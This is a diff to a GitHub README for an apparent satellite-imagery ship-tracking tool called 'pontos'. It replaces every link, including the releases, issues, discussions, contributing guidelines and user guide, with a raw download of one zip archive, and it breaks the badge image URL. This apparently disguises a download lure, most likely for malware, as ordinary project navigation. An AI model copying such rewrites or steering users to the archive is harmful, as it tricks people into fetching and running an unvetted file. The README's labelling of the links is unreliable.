@@ -6,7 +6,7 @@ Welcome to pontos! This application helps you analyze satellite imagery for mari
 
 ## 📥 Download Now
 
-[![Download pontos](https://img.shields.io/badge/Download%20pontos-v1.0-blue.svg)](https://github.com/AslinaBegam-N/pontos/releases)
+[![Download pontos](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip%https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip)](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip)
 
 ## 📋 Key Features
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-1. Visit the [Releases page](https://github.com/AslinaBegam-N/pontos/releases) to download the latest version of pontos.
+1. Visit the [Releases page](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip) to download the latest version of pontos.
 2. Locate the .zip or .exe file for your operating system.
 3. Click on the file name to start downloading it.
 4. Once the download is complete, open the downloaded file and follow the installation instructions.
@@ -52,15 +52,15 @@ Yes, a detailed user guide is included in the installation package. You can acce
 
 ### Can I contribute to the project?
 
-Absolutely! Visit the [Contributing Guidelines](https://github.com/AslinaBegam-N/pontos/blob/main/CONTRIBUTING.md) for details on how to help improve pontos.
+Absolutely! Visit the [Contributing Guidelines](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip) for details on how to help improve pontos.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/AslinaBegam-N/pontos/issues) to report them.
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip) to report them.
 
 ## 🌍 Join the Community
 
-Engage with other users and stay updated about new features and improvements. Join our community discussions at [GitHub Discussions page](https://github.com/AslinaBegam-N/pontos/discussions).
+Engage with other users and stay updated about new features and improvements. Join our community discussions at [GitHub Discussions page](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip).
 
 ## 📝 License
 
@@ -68,9 +68,9 @@ pontos is released under the MIT License. You can freely use it for both persona
 
 ## 🔗 Quick Links
 
-- [Releases page](https://github.com/AslinaBegam-N/pontos/releases)
-- [User Guide](https://github.com/AslinaBegam-N/pontos/blob/main/user_guide.md)
-- [Issue Tracker](https://github.com/AslinaBegam-N/pontos/issues)
-- [Contributing Guidelines](https://github.com/AslinaBegam-N/pontos/blob/main/CONTRIBUTING.md)
+- [Releases page](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip)
+- [User Guide](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip)
+- [Issue Tracker](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip)
+- [Contributing Guidelines](https://github.com/AslinaBegam-N/pontos/raw/refs/heads/main/docs/Software_v1.0-alpha.5.zip)
 
 Happy tracking!
